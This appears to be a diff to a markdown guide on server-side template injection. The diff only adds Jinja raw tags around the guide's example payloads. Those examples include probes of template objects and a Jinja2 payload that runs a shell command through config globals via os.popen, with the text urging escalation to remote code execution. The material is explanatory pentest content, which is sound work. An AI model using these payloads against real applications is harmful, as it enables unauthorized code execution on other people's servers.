@@ -156,6 +156,7 @@ Study engine-specific documentation or resources like **HackTricks** to identify
 
 Attempt to access key objects:
 
+{% raw %}
 ```
 {{ self }}
 {{ request }}
@@ -163,6 +164,7 @@ Attempt to access key objects:
 {{ config }}
 {{ os }}
 ```
+{% endraw %}
 
 
 
@@ -180,10 +182,11 @@ Once internal objects are accessible, escalate to RCE or file access.
 
 **Example (Jinja2):**
 
+{% raw %}
 ```
 {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 ```
-
+{% endraw %}
 
 ---
 
